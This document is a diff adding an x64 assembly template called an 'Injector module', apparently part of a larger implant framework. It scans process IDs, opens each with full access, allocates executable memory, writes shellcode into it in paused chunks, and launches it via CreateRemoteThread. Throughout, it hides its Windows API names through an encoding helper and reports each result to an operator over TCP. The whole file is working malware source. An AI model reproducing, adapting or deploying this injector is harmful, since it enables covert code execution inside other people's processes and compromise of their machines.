@@ -1,0 +1,480 @@
+#!name##ZAX_PACMAN
+#!types##sfile
+#!info##Injector module
+
+
+extern atoi
+extern sprintf
+
+%define PAC_PROCESS_ALL_ACCESS 0x001FFFFF
+%define PAC_DEFAULT_MEM_SIZE {{ZAX_sc_buff}}
+%define PAC_PAGE_EXECUTE_READWRITE 0x00000040
+%define PAC_VIRTUAL_MEM_FLAG 0x00001000 | 0x00002000    ; MEM_COMMIT | MEM_RESERVE
+%define PAC_DEFAULT_BYTES_INJECT {{PAC_inj_bytes}}
+%define PAC_SCODE_PAUSE_INJECT {{PAC_inj_pause}}  ; pause in milisecond
+%define PAC_RESPONSE_BUFFER 512
+
+section .data
+    pac_text_out: db "OUT: %s", 10, 0
+    pac_text_err: db "ERROR: %d", 10, 0
+    pac_text_pid: db "Try: %d", 10, 0
+    pac_text_me: db "Mission complete", 10, 0
+    pac_text_in: db "INN Mission complete", 10, 0
+
+    pac_max_hp: equ 10000 ; default process pid limit
+    pac_min_hp: equ 500 ; default start process pid
+    pac_first_hit: db "A", 0    ; test memory byte
+    pac_not_find: db "Error: not find process", 10, 0
+    pac_find_player: db "Find process successfull: %d", 10, 0
+    pac_hit_player: db "Mission Complete: Injection", 10, 0
+    pac_no_hit_player: db "Error: start thread failed", 10, 0
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+    
+    pac_weapon_op: dd {{TOOL.AsmSh_encode("OpenProcess")}} ; OpenProcess
+    pac_weapon_vae: dd {{TOOL.AsmSh_encode("VirtualAllocEx")}} ; VirtualAllocEx
+    pac_weapon_wpm: dd {{TOOL.AsmSh_encode("WriteProcessMemory")}} ; WriteProcessMemory
+    pac_weapon_sl: dd {{TOOL.AsmSh_encode("Sleep")}} ; Sleep
+    pac_weapon_crt: dd {{TOOL.AsmSh_encode("CreateRemoteThread")}} ; CreateRemoteThread
+
+{% set _ = TOOL.AsmSh_reset_table() %} 
+    
+section .bss
+    pac_work_sword: resq 1     ; process handle
+    pac_work_bag: resq 1       ; memory address
+    pac_work_iid: resq 1       ; process PID
+    pac_life_bar: resb PAC_DEFAULT_BYTES_INJECT     ; buffer for part of shellcode
+    pac_life_hit: resq 1    ; memory index
+    pac_pl_op: resq 1       ; OpenProcess addr
+    pac_pl_vae: resq 1      ; VirtualAllocEx addr
+    pac_pl_wpm: resq 1      ; WriteProcessMemory addr
+    pac_pl_sl: resq 1       ; Sleep addr
+    pac_resp_buff: resb PAC_RESPONSE_BUFFER     ; buffer for text
+    
+section .text
+
+PAC_eat:
+; Function finds an open process and tries to inject and run shellcode.
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - args struct (4 * 8 bytes)
+
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; args
+    mov rbx, rcx
+    
+    ; str to int
+    sub rsp, 40
+    mov rcx, [rbx+8]    ; 1st arg
+    call atoi
+    mov [rbp-16], rax   ; save 1st int arg
+    mov rbx, [rbp-8]
+    mov rcx, [rbx+16]   ; 2nd arg
+    call atoi
+
+
+   
+    ; find a vulnerable process    
+    mov rcx, [rbp-16]   ; 1st int arg
+    mov rdx, rax  ; 2nd int arg
+    call PAC_eat_proc
+    add rsp, 40
+    cmp rax, 0
+    je .return
+    
+    ; create thread
+    sub rsp, 72
+    mov rcx, pac_weapon_crt
+    mov rdx, 0
+    call PITF_get
+    lea rcx, [pac_work_sword]
+    mov rcx, [rcx]  ; proc handle
+    mov rdx, 0
+    mov r8, 0
+    lea r9, [pac_work_bag]
+    mov r9, [r9]    ; mem addr
+    mov qword [rsp+32], 0
+    mov qword [rsp+40], 0
+    mov qword [rsp+48], 0
+    call rax    ; call CreateRemoteThread
+    add rsp, 72
+    cmp rax, 0
+    je .error
+    
+    sub rsp, 40
+    mov rcx, pac_hit_player
+    call TCP_send
+    add rsp, 40
+    
+    ;reset STORAGE index
+    sub rsp, 40
+    call ZST_get_reset
+    add rsp, 40
+    
+    
+   
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+    .error:
+        sub rsp, 40
+        mov rcx, pac_no_hit_player
+        call TCP_send
+        add rsp, 40
+        jmp .return
+
+
+PAC_Init:
+; Initialize module
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    sub rsp, 40
+    mov rcx, pac_weapon_op
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [pac_pl_op]
+    mov [rbx], rax  ; save OpenProcess addr
+    mov rcx, pac_weapon_vae
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [pac_pl_vae]
+    mov [rbx], rax  ; save VirtualAllocEx addr
+    mov rcx, pac_weapon_wpm
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [pac_pl_wpm]
+    mov [rbx], rax  ; save WriteProcessMemory addr
+    mov rcx, pac_weapon_sl
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [pac_pl_sl]
+    mov [rbx], rax  ; save Sleep addr
+    add rsp, 40
+    
+    add rsp, 8
+    pop rbp
+    ret
+
+
+
+PAC_eat_proc:
+; try find process and try inject shellcode into them
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - start process pid or 0 (use default)
+; IN: rdx - max pid or 0 (use default)
+; OUT: rax - '1' success, '0' - fail
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    push r12
+    push r13
+    push r14
+    push r15
+    
+    ; reset buffer
+    lea rax, [pac_work_sword]
+    mov qword [rax], 0
+    lea rax, [pac_work_bag]
+    mov qword [rax], 0
+    lea rax, [pac_life_hit]
+    mov qword [rax], 0
+    lea rax, [pac_work_iid]
+    mov qword [rax], 0
+    
+    ;find process
+    sub rsp, 40
+    call PAC_get_player
+    add rsp, 40
+    cmp rax, 0
+    je .no_process
+    
+    
+    ; send response
+    sub rsp, 40
+    lea rcx, [pac_resp_buff]
+    mov rdx, pac_find_player
+    lea r8, [pac_work_iid]
+    mov r8, [r8]
+    call sprintf
+    lea rcx, [pac_resp_buff]
+    call TCP_send
+    add rsp, 40
+    
+    lea r14, [pac_work_sword]
+    mov r14, [r14]  ; proc handle
+    lea r15, [pac_work_bag]
+    mov r15, [r15]  ; mem addr
+    
+    ; write to memory
+    .write_mem:
+        ; get part of code
+        sub rsp, 40
+        call PAC_get_item
+        add rsp, 40
+        cmp rax, 0
+        je .last_write
+        
+        ;pause
+        sub rsp, 40
+        mov rcx, PAC_SCODE_PAUSE_INJECT
+        lea rax, [pac_pl_sl]
+        mov rax, [rax]
+        call rax    ; call Sleep
+        add rsp, 40
+        
+        sub rsp, 56
+        mov rcx, r14
+        mov rdx, r15
+        lea rbx, [pac_life_hit]
+        mov rbx, [rbx]  ; get memory index
+        add rdx, rbx    ; memory + index
+        lea r8, [pac_life_bar]
+        mov r9, PAC_DEFAULT_BYTES_INJECT
+        mov qword [rsp+32], 0
+        lea rax, [pac_pl_wpm]
+        mov rax, [rax]
+        call rax    ; call WriteProcessMemory
+        ;call WriteProcessMemory
+        add rsp, 56
+        cmp rax, 0
+        je .error
+        
+        .update_index:
+        ; update memory index
+        lea rbx, [pac_life_hit]
+        mov rcx, [rbx]
+        add rcx, PAC_DEFAULT_BYTES_INJECT
+        mov qword [rbx], rcx    ; save new memory index
+        
+        sub rsp, 40
+        mov rcx, pac_text_me
+        call printf
+        add rsp, 40
+        
+        jmp .write_mem
+
+    
+    
+    .return:
+        pop r15
+        pop r14
+        pop r13
+        pop r12
+        add rsp, 8
+        pop rbp
+        ret
+    
+    .no_process:
+        sub rsp, 40
+        mov rcx, pac_not_find
+        call printf
+        add rsp, 40
+        jmp .return
+    
+    .error:
+        sub rsp, 40
+        call GetLastError
+        mov rcx, pac_text_err
+        mov rdx, rax
+        call printf
+        add rsp, 40
+        xor rax, rax    ; return False
+        jmp .return
+
+    .last_write:
+        sub rsp, 56
+        mov rcx, r14
+        mov rdx, r15
+        lea rbx, [pac_life_hit]
+        mov rbx, [rbx]  ; get memory index
+        add rdx, rbx    ; memory + index
+        lea r8, [pac_life_bar]
+        mov r9, PAC_DEFAULT_BYTES_INJECT
+        mov qword [rsp+32], 0
+        lea rax, [pac_pl_wpm]
+        mov rax, [rax]
+        call rax    ; call WriteProcessMemory
+        ;call WriteProcessMemory
+        add rsp, 56
+        cmp rax, 0
+        je .error
+        sub rsp, 40
+        mov rcx, pac_text_in
+        call printf
+        add rsp, 40
+        jmp .return
+
+PAC_get_item:
+; get piece of shellcode and put to buffer
+; REQUIREMENTS: stack allign to 16
+; OUT: rax - '0' shellcode end
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    push r14
+    push r15
+    
+    ;reset buffer
+    lea rdi, [pac_life_bar]
+    mov rcx, PAC_DEFAULT_BYTES_INJECT
+    xor rax, rax
+    cld
+    rep stosb
+    
+    sub rsp, 40 ; shadow space
+    xor r15, r15    ; counter
+    lea r14, [pac_life_bar] ; buffer
+    .get_code:
+        cmp r15, PAC_DEFAULT_BYTES_INJECT
+        je .buff_full
+        call ZST_get
+        cmp al, 0
+        je .fill_zero
+        mov byte [r14+r15], al  ; put byte in buffer
+        inc r15
+        jmp .get_code
+    
+    .return:
+        add rsp, 40
+        pop r15
+        pop r14
+        add rsp, 8
+        pop rbp
+        ret
+
+    .buff_full:
+        mov rax, 1
+        jmp .return
+
+    .end_code:   
+        xor rax, rax
+        jmp .return
+    
+    .fill_zero:
+        cmp r15, PAC_DEFAULT_BYTES_INJECT
+        je .end_code
+        mov byte [r14+r15], 0
+        inc r15
+        jmp .fill_zero
+    
+
+
+    
+
+
+PAC_get_player:
+; search process to injection
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - start process pid or 0 (use default)
+; IN: rdx - max pid or 0 (use default)
+; OUT: rax - '1' - success, '0' - fail
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    ; [rbp-8] - start pid
+    ; [rbp-16] - last pid
+    cmp rcx, 0
+    je .load_default
+    jmp .use_user
+    
+    
+    .begin:
+        xor r15, r15    ; counter
+        mov r15, [rbp-8]
+        sub rsp, 56     ; shadow space
+    ; open process
+    .op_proc:
+        ; check pid limit
+        cmp r15, [rbp-16]
+        jg .end_loop
+        mov rcx, pac_text_pid
+        mov rdx, r15
+        call printf
+        ; try open process
+        mov rcx, PAC_PROCESS_ALL_ACCESS
+        mov rdx, 0
+        mov r8, r15
+        lea rax, [pac_pl_op]
+        mov rax, [rax]
+        call rax    ; call OpenProcess
+        ;call OpenProcess
+        cmp rax, 0
+        je .try_again
+        lea rcx, [pac_work_sword]
+        mov [rcx], rax  ; save process handle
+
+        ; try alloc memory
+        lea rcx, [pac_work_sword]
+        mov rcx, [rcx]  ; proc handle
+        mov rdx, 0
+        mov r8, PAC_DEFAULT_MEM_SIZE
+        mov r9, PAC_VIRTUAL_MEM_FLAG
+        mov qword [rsp+32], PAC_PAGE_EXECUTE_READWRITE
+        lea rax, [pac_pl_vae]
+        mov rax, [rax]
+        call rax    ; call VirtualAllocEx
+        ;call VirtualAllocEx
+        cmp rax, 0
+        je .try_again
+        lea rcx, [pac_work_bag]
+        mov [rcx], rax  ; save memory address
+
+        
+        ; memory test
+        lea rcx, [pac_work_sword]
+        mov rcx, [rcx]  ; proc handle
+        lea rdx, [pac_work_bag]
+        mov rdx, [rdx]  ; mem addr
+        lea r8, [pac_first_hit] ; test byte
+        mov r9, 1   ; one byte
+        mov  qword [rsp+32], 0
+        lea rax, [pac_pl_wpm]
+        mov rax, [rax]
+        call rax    ; call WriteProcessMemory
+        ;call WriteProcessMemory
+        cmp rax, 0
+        je .error
+        ; save pid process
+        lea rbx, [pac_work_iid]
+        mov qword [rbx], r15    ; save PID process
+        jmp .end_loop
+        
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .error:
+        call GetLastError
+        mov rcx, pac_text_err
+        mov rdx, rax
+        call printf
+        jmp .try_again
+
+    .try_again:
+        inc r15     ; pid + 1
+        jmp .op_proc
+
+    .end_loop:
+        add rsp, 56 ; restore stack
+        jmp .return
+    
+    .load_default:
+        mov rax, pac_min_hp
+        mov [rbp-8], rax    ; start pid
+        mov rax, pac_max_hp
+        mov [rbp-16], rax   ; last pid
+        jmp .begin
+    
+    .use_user:
+        mov [rbp-8], rcx    ; start pid
+        mov [rbp-16], rdx   ; last pid
+        jmp .begin
